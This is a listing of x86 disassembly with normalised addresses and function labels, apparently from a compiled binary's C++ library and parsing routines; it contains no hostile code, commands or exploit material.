mov eax sub_44c900
call sub_4485c8
mov edi ecx
mov esi [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
sub eax edi
mov ecx esi
call sub_40df53
and [ ebp - 0x4 ] 0x0
call sub_44866d
retn 0xc
movzx eax [ edi ]
push eax
call sub_405352
inc edi
jmp r-xdata
cmp edi [ ebp + 0xc ]
je r-xdata
sub_40d1c0
push ebp
mov ebp esp
mov al [ ecx ]
mov edx [ ebp + 0xc ]
push esi
test al al
je r-xdata
cmp [ ebp + 0x8 ] edx
jne r-xdata
cmp [ ebp + 0x8 ] edx
je r-xdata
xor eax eax
xor eax eax
inc eax
jmp r-xdata
cmp [ ecx ] 0x0
jne r-xdata
mov esi [ ebp + 0x8 ]
cmp al [ esi ]
jne r-xdata
pop esi
pop ebp
retn
xor al al
jmp r-xdata
inc ecx
mov al [ ecx ]
inc [ ebp + 0x8 ]
test al al
jne r-xdata
sub_40d1fb
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test [ eax + 0x208 ] 0x2000
je r-xdata
mov eax edi
pop ebp
retn 0x8
mov eax [ ebp + 0xc ]
cmp eax [ edi ]
je r-xdata
push ebx
push esi
inc esi
mov [ edi ] esi
cmp bl 0x23
jne r-xdata
mov eax [ ebp + 0x8 ]
push ebx
call sub_40e081
test al al
je r-xdata
cmp [ ebp + 0xc ] esi
jne r-xdata
cmp [ ebp + 0xc ] esi
je r-xdata
pop esi
pop ebx
movzx eax [ esi ]
push eax
mov eax [ ebp + 0x8 ]
call sub_40e081
test al al
je r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ edi ]
jne r-xdata
mov al [ esi ]
inc esi
mov [ edi ] esi
cmp al 0xa
jne r-xdata
inc esi
mov [ edi ] esi
mov esi [ edi ]
movzx ebx [ esi ]
cmp bl 0x23
je r-xdata
jmp r-xdata
sub_40d26c
mov ecx [ edx ]
movsx eax [ ecx ]
cmp eax 0x45
jg r-xdata
cmp eax 0x51
je r-xdata
je r-xdata
push 0x12
cmp eax 0x5a
je r-xdata
push 0x13
jmp r-xdata
sub eax 0x3c
je r-xdata
push 0x21
jmp r-xdata
cmp eax 0x62
je r-xdata
inc ecx
mov [ edx ] ecx
pop eax
retn
push 0x24
jmp r-xdata
dec eax
dec eax
je r-xdata
push 0x26
jmp r-xdata
push 0x2
pop eax
retn
push 0x25
jmp r-xdata
sub eax 0x3
je r-xdata
push 0x20
jmp r-xdata
dec eax
jne r-xdata
push 0x27
jmp r-xdata
sub_40d2bf
push ebp
mov ebp esp
push ecx
push edi
push ebx
push [ ebp + 0x8 ]
mov edi eax
call sub_40d1fb
and [ esi + 0x10 ] 0x0
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp [ edi ] ebx
jne r-xdata
mov [ eax ] 0x0
jmp r-xdata
mov eax [ edi ]
movzx eax [ eax ]
mov [ ebp - 0x4 ] al
push eax
mov eax [ ebp + 0x8 ]
call sub_40e0af
test al al
je r-xdata
push ebx
push [ ebp + 0x8 ]
call sub_40d1fb
cmp [ esi + 0x10 ] 0x0
push 0x1b8
push r--data
push r--data
setne al
push r--data
movzx eax al
push 0x5
push eax
call sub_403978
add esp 0x18
pop edi
leave
retn 0x4
push [ ebp - 0x4 ]
mov eax esi
call sub_403acf
inc [ edi ]
sub_40d340
push 0x28
mov eax sub_44d3f2
call sub_448595
mov esi ecx
mov [ ebp - 0x10 ] 0x1
mov ebx r--data
mov edi r--data
push 0x14
pop eax
call sub_44866d
retn 0x8
cmp al 0x2d
je r-xdata
cmp [ ebp - 0x10 ] 0x0
sete al
mov [ ebp - 0x10 ] al
test al al
jne r-xdata
cmp al 0x3a
je r-xdata
push 0x5
mov eax r--data
lea esi [ ebp - 0x34 ]
call sub_4038f9
and [ ebp - 0x4 ] 0x0
push 0x190
push ebx
push edi
push eax
call sub_405e22
inc [ esi ]
mov eax [ esi ]
cmp eax [ ebp + 0xc ]
push 0x192
push ebx
push edi
setne al
push r--data
movzx eax al
push 0x5
push eax
call sub_403978
add esp 0x18
test al al
jne r-xdata
inc [ esi ]
jmp r-xdata
cmp al 0x69
je r-xdata
mov eax [ esi ]
mov al [ eax ]
cmp al 0x29
je r-xdata
push [ ebp - 0x10 ]
push 0x2
pop eax
cmp al 0x6d
je r-xdata
cmp [ ebp - 0x10 ] 0x0
sete al
movzx eax al
push eax
mov eax 0x400
jmp r-xdata
cmp al 0x73
je r-xdata
mov ecx [ ebp + 0x8 ]
call sub_40e060
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
sete al
movzx eax al
push eax
mov eax 0x1000
jmp r-xdata
cmp al 0x78
jne r-xdata
push [ ebp - 0x10 ]
mov eax 0x2000
jmp r-xdata
sub_40d430
push 0x20
mov eax sub_44e325
call sub_448595
mov esi [ ebp + 0xc ]
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ esi ] 0x1
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov [ esi + 0x10 ] ebx
mov [ esi + 0x14 ] ebx
mov [ esi + 0x18 ] ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x10 ]
cmp [ eax ] edi
jne r-xdata
mov ecx [ ebp + 0x8 ]
push edi
push [ ebp + 0x10 ]
lea eax [ ebp - 0x2c ]
push eax
call sub_40f078
mov [ ebp - 0x4 ] 0x2
lea eax [ ebp - 0x2c ]
cmp [ ebp - 0x20 ] ebx
je r-xdata
jmp r-xdata
push eax
mov [ ebp - 0x4 ] bl
call sub_4069e4
mov ecx esi
call sub_406cd3
lea eax [ ebp - 0x2c ]
push eax
mov [ ebp - 0x4 ] bl
call sub_4069e4
mov eax esi
call sub_44866d
retn 0xc
sub_40d4b3
push 0x8
mov eax sub_44d3cf
call sub_448595
and [ ebp - 0x14 ] 0x0
push 0x48
call sub_424ff8
mov esi eax
pop ecx
mov [ ebp - 0x10 ] esi
xor edi edi
inc edi
mov [ ebp - 0x4 ] edi
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
call sub_40e178
mov esi eax
jmp r-xdata
mov [ ebp - 0x4 ] 0x2
push [ ebp + 0x8 ]
lea ebx [ ebp - 0x10 ]
call sub_40f174
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
lea eax [ esi + 0x4 ]
mov ecx edi
[ eax ] ecx
mov [ ebp - 0x10 ] esi
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
call sub_44866d
retn
add esi 0x4
call sub_40c2c3
sub_40d526
push 0x8
mov eax sub_44c8e5
call sub_448595
and [ ebp - 0x10 ] 0x0
sub esp 0x1c
xor esi esi
inc esi
mov eax esp
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x14 ] esp
call sub_40b872
lea eax [ ebp + 0xc ]
push eax
call sub_40bf8f
mov ecx eax
mov eax [ ebp + 0x8 ]
call sub_40b872
lea eax [ ebp + 0xc ]
push eax
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x0
call sub_4069e4
mov eax [ ebp + 0x8 ]
call sub_44866d
retn
sub_40d575
push 0x0
mov eax sub_44b45c
call sub_448595
mov edi [ ebp + 0x8 ]
mov esi ebx
mov [ edi ] 0x1
call sub_40e158
xor edx edx
mov [ edi + 0x4 ] edx
mov [ edi + 0x8 ] edx
mov eax [ ebx ]
cmp eax edx
je r-xdata
mov [ edi + 0xc ] eax
cmp eax edx
je r-xdata
xor esi esi
lea ecx [ eax + 0x4 ]
inc esi
[ ecx ] esi
mov [ ebp - 0x4 ] edx
cmp eax edx
je r-xdata
xor esi esi
lea ecx [ eax + 0x4 ]
inc esi
[ ecx ] esi
mov esi ebx
call sub_40e158
add eax 0x8
mov [ edi + 0x10 ] eax
and [ edi + 0x14 ] 0x0
and [ edi + 0x18 ] 0x0
mov eax edi
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_40d5e5
push ebp
mov ebp esp
push ecx
push esi
push ecx
mov [ ebp - 0x4 ] esp
mov esi eax
mov [ ebp - 0x4 ] esp
call sub_40eb0d
mov eax [ ebp + 0x8 ]
mov [ esi + 0x18 ] eax
mov [ esi + 0x1c ] rw-data
mov [ esi + 0x20 ] 0x0
mov eax esi
pop esi
leave
retn 0x4
sub_40d610
push ebp
mov ebp esp
mov [ esi ] eax
push edi
xor eax eax
lea edi [ esi + 0x4 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov edi [ ebp + 0x8 ]
xor eax eax
mov [ esi + 0x11 ] al
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] eax
mov [ esi + 0x1c ] eax
mov al [ ebp + 0xc ]
mov [ esi + 0x20 ] al
mov eax esi
call sub_40f1f9
mov eax esi
pop edi
pop ebp
retn 0x8
sub_40d643
push ebp
mov ebp esp
push ecx
push ecx
and [ ebp - 0x4 ] 0x0
push esi
mov esi eax
mov eax [ esi + 0x4 ]
push edi
cmp eax [ esi + 0x8 ]
je r-xdata
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
mov ecx esi
push [ ebp + 0x8 ]
push ebx
call sub_40f237
add esp 0xc
mov edi [ esi ]
add edi 0x8
call sub_40e881
cmp eax 0x1
je r-xdata
push 0x128
call sub_424ff8
mov edi eax
pop ecx
test edi edi
je r-xdata
push 0x4d
push r--data
push r--data
call sub_4258e2
add esp 0xc
xor edi edi
mov al [ esi + 0xc ]
mov ecx [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
and [ edi + 0x4 ] 0x0
mov [ ebp - 0x4 ] al
push [ ebp - 0x4 ]
lea esi [ edi + 0x8 ]
mov [ edi ] r--data
call sub_40e95b
jmp r-xdata
pop edi
mov eax ebx
pop esi
leave
retn
xor ecx ecx
lea eax [ edi + 0x4 ]
inc ecx
[ eax ] ecx
jmp r-xdata
mov [ ebx ] edi
test edi edi
je r-xdata
sub_40d6e1
push 0x8
mov eax sub_44e2dc
call sub_4485c8
mov esi ecx
call sub_40e0dd
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov esi eax
lea eax [ esi + 0xc ]
push eax
mov [ ebp - 0x14 ] esi
call sub_40fd4f
mov eax esi
call sub_44866d
retn 0x4
sub_40d732
push ebp
mov ebp esp
push ecx
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x4 ]
mov esi eax
call sub_40f2f0
mov ecx [ esi ]
mov edx [ eax ]
mov [ esi ] edx
mov [ eax ] ecx
mov esi [ ebp - 0x4 ]
test esi esi
je r-xdata
push [ ebp + 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_403887
add esp 0xc
pop esi
leave
retn
call sub_40379c
sub_40d788
push ebp
mov ebp esp
push esi
mov esi eax
call sub_40cfe9
mov ecx [ ebp + 0x8 ]
mov esi eax
lea eax [ esi + 0xc ]
push eax
call sub_411465
mov eax esi
pop esi
pop ebp
retn 0x4
sub_40d7b9
push 0x8
mov eax sub_44c8a7
call sub_448595
and [ ebp - 0x14 ] 0x0
push 0xc
call sub_424ff8
pop ecx
test eax eax
je r-xdata
xor esi esi
mov esi eax
call sub_40e2a6
mov esi eax
jmp r-xdata
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
lea ebx [ ebp - 0x10 ]
call sub_40f367
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
lea eax [ esi + 0x4 ]
mov ecx edi
[ eax ] ecx
xor edi edi
inc edi
mov [ ebp - 0x10 ] esi
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
call sub_44866d
retn
add esi 0x4
call sub_40c2c3
sub_40d81f
push 0x30
mov eax sub_44c86b
call sub_448595
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
mov ecx [ ebp + 0xc ]
mov ebx [ ecx + 0x4 ]
push [ ebp + 0x10 ]
mov edi [ eax + 0x4 ]
mov ecx [ eax ]
lea esi [ ebp - 0x20 ]
je r-xdata
call sub_40e3b9
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x3c ]
push eax
mov [ ebp - 0x4 ] 0x2
call sub_40f440
pop ecx
pop ecx
mov esi [ ebp + 0xc ]
mov ebx eax
mov [ ebp - 0x4 ] 0x3
call sub_406dc4
mov [ ebp - 0x4 ] 0x2
call sub_40e33e
and [ ebp - 0x4 ] 0x0
mov eax esi
push eax
lea eax [ ebp - 0x3c ]
push eax
call sub_40f3d7
pop ecx
pop ecx
mov esi [ ebp + 0xc ]
mov ebx eax
mov [ ebp - 0x4 ] 0x1
call sub_406dc4
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
call sub_44866d
retn
lea esi [ eax + 0x4 ]
call sub_40c2c3
lea eax [ ebp - 0x3c ]
push eax
call sub_4069e4
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x20 ]
test eax eax
je r-xdata
sub_40d8bf
push 0x8
mov eax sub_44c82c
call sub_448595
and [ ebp - 0x14 ] 0x0
push 0x10
call sub_424ff8
mov esi eax
pop ecx
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
call sub_40e434
mov esi eax
jmp r-xdata
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
lea ebx [ ebp - 0x10 ]
call sub_40f4a9
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
lea eax [ esi + 0x4 ]
mov ecx edi
[ eax ] ecx
xor edi edi
inc edi
mov [ ebp - 0x10 ] esi
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
call sub_44866d
retn
add esi 0x4
call sub_40c2c3
sub_40d928
push 0x4
mov eax sub_44b436
call sub_448595
and [ ebp - 0x10 ] 0x0
mov eax [ ebp + 0x28 ]
xor esi esi
inc esi
lea ecx [ ebp + 0xc ]
mov [ ebp - 0x4 ] esi
call sub_406cd3
mov ecx eax
mov eax [ ebp + 0x8 ]
call sub_40b872
lea eax [ ebp + 0xc ]
push eax
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x0
call sub_4069e4
mov eax [ ebp + 0x8 ]
call sub_44866d
retn
sub_40d96c
push 0x8
mov eax sub_44c7f0
call sub_448595
and [ ebp - 0x14 ] 0x0
push 0x10
call sub_424ff8
mov esi eax
pop ecx
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
call sub_40e4fa
mov esi eax
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
call sub_40f518
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
lea eax [ esi + 0x4 ]
mov ecx edi
[ eax ] ecx
xor edi edi
inc edi
mov [ ebp - 0x10 ] esi
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
call sub_44866d
retn
add esi 0x4
call sub_40c2c3
sub_40d9d6
push 0x88
mov eax sub_44c7b1
call sub_448595
mov esi ecx
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov eax [ ebx + 0x4 ]
cmp eax 0x1
jbe r-xdata
push 0x132
push r--data
push r--data
call sub_4258e2
add esp 0xc
cmp [ ebx ] 0x0
jne r-xdata
mov ecx [ ebx ]
test ecx ecx
jne r-xdata
call sub_44866d
retn
push ebx
mov ecx edi
mov edx esi
call sub_40f6c0
pop ecx
and [ ebp - 0x18 ] 0x0
cmp [ ebx + 0x8 ] 0x0
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x24 ]
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x24 ] edi
mov [ ebp - 0x20 ] ecx
push eax
je r-xdata
inc ecx
lea eax [ ebp - 0x94 ]
push eax
call sub_40f659
pop ecx
pop ecx
push eax
sub esp 0x1c
mov [ ebp - 0x10 ] esp
mov ebx esp
push esi
sub esp 0x1c
mov eax esp
lea ecx [ ebp - 0x14 ]
mov [ ebp - 0x10 ] esp
push ecx
push eax
mov [ ebp - 0x4 ] 0x2
call sub_40f589
pop ecx
pop ecx
push ebx
call sub_40d928
lea eax [ ebp - 0x5c ]
add esp 0x24
push eax
call sub_40d928
add esp 0x24
mov ebx eax
mov [ ebp - 0x4 ] 0x3
call sub_406dc4
lea eax [ ebp - 0x5c ]
push eax
mov [ ebp - 0x4 ] 0x2
call sub_4069e4
lea eax [ ebp - 0x94 ]
lea eax [ ebp - 0x78 ]
push eax
call sub_40f5f2
pop ecx
pop ecx
and [ ebp - 0x4 ] 0x0
push eax
sub esp 0x1c
mov [ ebp - 0x10 ] esp
mov ebx esp
push esi
sub esp 0x1c
mov eax esp
lea ecx [ ebp - 0x14 ]
mov [ ebp - 0x10 ] esp
push ecx
push eax
call sub_40f589
pop ecx
pop ecx
push ebx
call sub_40d928
lea eax [ ebp - 0x40 ]
add esp 0x24
push eax
call sub_40d928
add esp 0x24
mov ebx eax
mov [ ebp - 0x4 ] 0x1
call sub_406dc4
lea eax [ ebp - 0x40 ]
push eax
mov [ ebp - 0x4 ] 0x0
call sub_4069e4
lea eax [ ebp - 0x78 ]
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
push eax
call sub_4069e4
mov ebx [ ebp + 0x8 ]
sub_40db1c
push 0x3c
mov eax sub_44c76b
call sub_448595
mov esi ecx
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x2c ]
xor ebx ebx
push eax
mov [ ebp - 0x10 ] ebx
call sub_40f79a
pop ecx
pop ecx
mov ecx esi
mov [ ebp - 0x4 ] ebx
call sub_406cd3
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x2c ]
push eax
call sub_4069e4
mov eax [ ebp + 0x8 ]
mov edi [ esi + 0xc ]
mov [ ebp + 0x8 ] edi
cmp [ eax + 0x8 ] bl
je r-xdata
cmp edi ebx
je r-xdata
cmp edi ebx
je r-xdata
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
mov [ ebp - 0x4 ] 0x3
call sub_40f86c
pop ecx
pop ecx
mov ebx eax
mov [ ebp - 0x4 ] 0x4
call sub_406dc4
mov [ ebp - 0x4 ] 0x3
lea eax [ ebp - 0x48 ]
xor ecx ecx
lea eax [ edi + 0x4 ]
inc ecx
[ eax ] ecx
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x2c ]
push eax
mov [ ebp - 0x4 ] 0x1
call sub_40f803
pop ecx
pop ecx
mov ebx eax
mov [ ebp - 0x4 ] 0x2
call sub_406dc4
mov [ ebp - 0x4 ] 0x1
lea eax [ ebp - 0x2c ]
jmp r-xdata
xor ecx ecx
lea eax [ edi + 0x4 ]
inc ecx
[ eax ] ecx
call sub_44866d
retn
lea esi [ edi + 0x4 ]
call sub_40c2c3
push eax
call sub_4069e4
or [ ebp - 0x4 ] 0xffffffff
test edi edi
je r-xdata
sub_40dc10
push ebp
mov ebp esp
push esi
mov esi eax
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jne r-xdata
push 0x0
push 0x1
mov ecx esi
call sub_40487c
add esi 0x20
pop esi
pop ebp
retn
sub_40dc69
push 0x0
mov eax sub_44b3f8
call sub_448595
mov edi [ ebp + 0x8 ]
mov esi ebx
mov [ edi ] 0x1
call sub_40e0fd
xor edx edx
mov [ edi + 0x4 ] edx
mov [ edi + 0x8 ] edx
mov eax [ ebx ]
cmp eax edx
je r-xdata
mov [ edi + 0xc ] eax
cmp eax edx
je r-xdata
xor esi esi
lea ecx [ eax + 0x4 ]
inc esi
[ ecx ] esi
mov [ ebp - 0x4 ] edx
cmp eax edx
je r-xdata
xor esi esi
lea ecx [ eax + 0x4 ]
inc esi
[ ecx ] esi
mov esi ebx
call sub_40e0fd
add eax 0xc
mov [ edi + 0x10 ] eax
and [ edi + 0x14 ] 0x0
and [ edi + 0x18 ] 0x0
mov eax edi
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_40dcdf
test [ rw-data ] 0x1
jne r-xdata
test [ rw-data ] 0x2
jne r-xdata
or [ rw-data ] 0x1
call sub_40e602
push sub_44e6e8
call sub_42606a
pop ecx
test [ rw-data ] 0x4
jne r-xdata
or [ rw-data ] 0x2
mov [ rw-data ] rw-data
call sub_40e021
push sub_44e6d4
call sub_42606a
pop ecx
mov eax rw-data
retn
mov eax [ rw-data ]
or [ rw-data ] 0x4
mov [ rw-data ] eax
test eax eax
je r-xdata
push sub_44e6c0
call sub_42606a
pop ecx
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
sub_40dd62
push ebx
push esi
push edi
mov edi eax
mov esi [ edi + 0x4 ]
cmp [ esi + 0x8 ] 0x0
mov ebx [ edi ]
je r-xdata
cmp [ edi + 0x24 ] 0x0
je r-xdata
push 0x25
push r--data
push r--data
call sub_4258e2
add esp 0xc
cmp [ edi + 0x14 ] 0x0
je r-xdata
call sub_40f988
test al al
jne r-xdata
cmp [ edi + 0x1a ] 0x0
je r-xdata
mov eax [ edi ]
cmp eax [ edi + 0x10 ]
jne r-xdata
mov eax [ esi + 0x10 ]
mov [ esi ] eax
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] 0x1
jmp r-xdata
xor al al
jmp r-xdata
mov eax [ esi + 0x10 ]
mov [ esi ] eax
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] 0x1
mov esi [ edi + 0x38 ]
jmp r-xdata
mov eax [ edi ]
cmp eax [ esi + 0x10 ]
je r-xdata
mov [ edi + 0x1d ] 0x1
mov al 0x1
pop edi
pop esi
pop ebx
retn
test esi esi
jne r-xdata
push [ edi + 0x40 ]
mov eax [ esi ]
mov ecx esi
call [ eax + 0x4 ]
mov esi [ esi + 0x4 ]
sub_40de88
push ebp
mov ebp esp
push esi
mov esi eax
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jne r-xdata
mov eax esi
call sub_411921
add esi 0x4
pop esi
pop ebp
retn
sub_40debb
push ebp
mov ebp esp
sub esp 0x10
cmp eax 0x3fffffff
ja r-xdata
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
call sub_4252f8
push r--data
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] r--data
call sub_426f77
shl eax 0x2
push eax
call sub_424ff8
pop ecx
test eax eax
jne r-xdata
leave
retn
sub_40df53
push esi
mov esi ecx
push edi
mov edi [ esi + 0x10 ]
cmp edi eax
ja r-xdata
pop edi
pop esi
retn
cmp [ esi + 0x14 ] eax
je r-xdata
push 0x1
push eax
call sub_40545e
test al al
je r-xdata
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
mov [ esi + edi ] 0x0
mov esi [ esi ]
sub_40dfa2
push ebp
mov ebp esp
push ecx
push esi
push ecx
mov [ ebp - 0x4 ] esp
mov esi eax
mov [ ebp - 0x4 ] esp
call sub_40eb0d
mov eax esi
pop esi
leave
retn
sub_40dfbb
mov eax esi
mov ecx edi
call sub_40a6cf
mov ecx [ esi + 0x2c ]
mov eax [ edi + 0x2c ]
mov [ edi + 0x2c ] ecx
mov [ esi + 0x2c ] eax
mov ecx [ esi + 0x30 ]
mov eax [ edi + 0x30 ]
mov [ edi + 0x30 ] ecx
mov [ esi + 0x30 ] eax
mov ecx [ esi + 0x34 ]
mov eax [ edi + 0x34 ]
mov [ edi + 0x34 ] ecx
mov [ esi + 0x34 ] eax
lea eax [ esi + 0x38 ]
push eax
lea ecx [ edi + 0x38 ]
call sub_40e8d8
mov ecx [ esi + 0x48 ]
mov eax [ edi + 0x48 ]
mov [ edi + 0x48 ] ecx
mov [ esi + 0x48 ] eax
mov ecx [ esi + 0x4c ]
mov eax [ edi + 0x4c ]
mov [ edi + 0x4c ] ecx
mov [ esi + 0x4c ] eax
retn
sub_40e060
push ebp
mov ebp esp
add ecx 0x208
cmp [ ebp + 0x8 ] 0x0
je r-xdata
not eax
and eax [ ecx ]
mov edx eax
mov edx [ ecx ]
or edx eax
jmp r-xdata
mov [ ecx ] edx
pop ebp
retn 0x4
sub_40e081
push ebp
mov ebp esp
movzx ecx [ eax + 0x20c ]
xor edx edx
cmp dx cx
je r-xdata
xor eax eax
movzx edx [ ebp + 0x8 ]
mov ax [ eax + edx * 2 ]
and ax cx
xor ecx ecx
cmp cx ax
je r-xdata
xor eax eax
inc eax
jmp r-xdata
pop ebp
retn 0x4
sub_40e0af
push ebp
mov ebp esp
movzx ecx [ eax + 0x20e ]
xor edx edx
cmp dx cx
je r-xdata
xor eax eax
movzx edx [ ebp + 0x8 ]
mov ax [ eax + edx * 2 ]
and ax cx
xor ecx ecx
cmp cx ax
je r-xdata
xor eax eax
inc eax
jmp r-xdata
pop ebp
retn 0x4
sub_40e178
push ebx
lea ebx [ esi + 0x8 ]
call sub_40e677
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
call sub_40dcdf
mov eax [ eax ]
mov [ esi + 0x40 ] eax
pop ebx
test eax eax
je r-xdata
mov eax esi
retn
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
sub_40e1a7
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
lea esi [ edi + 0x40 ]
call sub_407804
lea eax [ edi + 0x8 ]
mov edi [ ebp + 0x8 ]
call sub_40fa73
pop edi
pop esi
pop ebp
retn 0x4
sub_40e1c7
push ebp
mov ebp esp
push esi
push edi
test ecx ecx
je r-xdata
xor edi edi
lea edi [ ecx + 0x8 ]
jmp r-xdata
lea esi [ ecx + 0x40 ]
push [ esi ]
push [ ebp + 0x8 ]
call sub_40fab7
call sub_407e47
mov edx [ eax ]
pop edi
pop esi
mov ecx eax
pop ebp
jmp [ edx + 0x8 ]
sub_40e1f3
push ebp
mov ebp esp
push esi
test ecx ecx
je r-xdata
xor esi esi
lea esi [ ecx + 0x8 ]
jmp r-xdata
lea eax [ ebp + 0xb ]
push eax
push [ ebp + 0x8 ]
call sub_40fae9
pop esi
pop ebp
retn 0x4
sub_40e274
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x2c ]
mov edx [ esi + 0x10 ]
push edi
mov edi [ esi ]
add eax 0x8
push eax
push edx
push edi
lea eax [ ebp + 0x8 ]
add ecx 0x8
push eax
call [ ecx + 0x18 ]
mov eax [ eax ]
xor ecx ecx
cmp eax [ esi + 0x10 ]
mov [ esi ] eax
pop edi
setne al
pop esi
pop ebp
retn 0x4
sub_40e2a6
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
call sub_40dcdf
mov eax [ eax ]
mov [ esi + 0x8 ] eax
test eax eax
je r-xdata
mov eax esi
retn
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
sub_40e33e
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ esi ] eax
test eax eax
je r-xdata
mov [ esi + 0x4 ] ecx
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] ebx
mov [ esi + 0x10 ] 0x0
cmp ecx edi
jbe r-xdata
xor edx edx
add eax 0x4
inc edx
[ eax ] edx
test edi edi
jne r-xdata
push 0x4f
push r--data
push r--data
call sub_4258e2
add esp 0xc
test ebx ebx
je r-xdata
push 0x50
push r--data
push r--data
call sub_4258e2
add esp 0xc
push 0x51
push r--data
push r--data
call sub_4258e2
add esp 0xc
cmp ebx 0x3ffffffe
jne r-xdata
mov eax esi
pop ebp
retn 0x4
sub_40e3b9
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ esi ] eax
test eax eax
je r-xdata
mov [ esi + 0x4 ] ecx
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] ebx
mov [ esi + 0x10 ] 0x0
cmp ecx edi
jbe r-xdata
xor edx edx
add eax 0x4
inc edx
[ eax ] edx
test edi edi
jne r-xdata
push 0x4f
push r--data
push r--data
call sub_4258e2
add esp 0xc
test ebx ebx
je r-xdata
push 0x50
push r--data
push r--data
call sub_4258e2
add esp 0xc
push 0x51
push r--data
push r--data
call sub_4258e2
add esp 0xc
cmp ebx 0x3ffffffe
jne r-xdata
mov eax esi
pop ebp
retn 0x4
sub_40e434
mov eax [ eax ]
mov [ esi + 0x8 ] eax
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
call sub_40dcdf
mov eax [ eax ]
mov [ esi + 0xc ] eax
test eax eax
je r-xdata
mov eax esi
retn
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
sub_40e45e
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
lea esi [ edi + 0xc ]
call sub_407804
mov ecx eax
mov eax [ ebp + 0x8 ]
lea edx [ edi + 0x8 ]
call sub_40fb41
pop edi
pop esi
pop ebp
retn 0x4
sub_40e495
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
cmp [ edi + 0x20 ] 0x0
je r-xdata
lea esi [ ecx + 0xc ]
call sub_407e47
mov edx [ eax ]
push edi
mov ecx eax
call [ edx + 0xc ]
pop edi
pop esi
pop ebp
retn 0x4
dec [ edi + 0x1c ]
sub_40e4fa
mov eax [ eax ]
mov [ esi + 0x8 ] eax
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
call sub_40dcdf
mov eax [ eax ]
mov [ esi + 0xc ] eax
test eax eax
je r-xdata
mov eax esi
retn
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
sub_40e524
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
lea esi [ edi + 0xc ]
call sub_407804
